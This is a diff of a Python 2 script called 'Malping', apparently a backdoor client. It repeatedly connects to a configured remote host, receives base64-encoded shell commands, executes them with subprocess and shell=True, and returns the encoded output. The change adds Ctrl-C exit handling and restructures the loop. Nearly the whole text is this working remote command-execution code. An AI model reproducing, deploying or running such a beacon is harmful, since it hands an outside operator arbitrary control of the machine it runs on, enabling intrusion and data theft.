@@ -20,22 +20,26 @@ SIZE = 1024
 PORT = 80
 
 def main():
-    print '[+] Malping started with delay of {} seconds.'.format(DELAY)
+    print '[+] Malping started with delay of {} seconds. Ctrl-c to exit.'.format(DELAY)
     while True:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
-            s.connect((HOST, PORT))
-            cmd = base64.b64decode(s.recv(SIZE))
-            print '[+] ({}) Executing "{}"'.format(datetime.datetime.now(),
-                                                   cmd)
-            stdout = subprocess.Popen(cmd, stdout=subprocess.PIPE,
-                                      shell=True).communicate()[0]
-            response = base64.b64encode(stdout)
-            s.send(response)
-        except socket.error:
-            print '[!] ({}) Could not connect to server. Waiting...'.format(datetime.datetime.now())
-        finally:
-            time.sleep(DELAY)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            try:
+                s.connect((HOST, PORT))
+                cmd = base64.b64decode(s.recv(SIZE))
+                print '[+] ({}) Executing "{}"'.format(datetime.datetime.now(),
+                                                       cmd)
+                stdout = subprocess.Popen(cmd, stdout=subprocess.PIPE,
+                                          shell=True).communicate()[0]
+                response = base64.b64encode(stdout)
+                s.send(response)
+            except socket.error:
+                print '[!] ({}) Could not connect to server. Waiting...'.format(datetime.datetime.now())
+            finally:
+                time.sleep(DELAY)
+        except KeyboardInterrupt:
+            print '[-] Malping terminated.'
+            sys.exit(0)
 
 if __name__ == '__main__':
     main()
